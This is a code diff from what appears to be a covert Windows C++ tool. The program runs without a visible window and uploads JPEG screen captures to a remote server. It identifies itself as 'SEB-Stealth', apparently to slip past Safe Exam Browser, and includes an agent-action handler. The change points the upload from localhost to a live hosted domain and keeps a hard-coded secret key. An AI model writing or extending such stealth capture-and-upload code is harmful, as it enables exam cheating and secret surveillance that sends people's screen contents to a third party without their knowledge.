@@ -23,7 +23,7 @@
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 // --- CONFIG ---
-const char* CLOUD_URL = "http://localhost:5000/upload";
+const char* CLOUD_URL = "https://exam-system-v1.onrender.com/upload";
 const char* SECRET_KEY = "super-secret-key"; 
 
 // --- GLOBALS ---
@@ -171,10 +171,9 @@ void ExecuteAgentAction(std::string responseStr) {
 void UploadToCloud(const std::vector<uint8_t>& jpegData, int user_id) {
     HINTERNET hSession = InternetOpenA("SEB-Stealth", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return;
-    // Note: In production change 127.0.0.1 to your Render URL
-    HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hConnect = InternetConnectA(hSession, "exam-system-v1.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) { InternetCloseHandle(hSession); return; }
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
     if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }
     
     std::string boundary = "----BoundaryGhostMode";
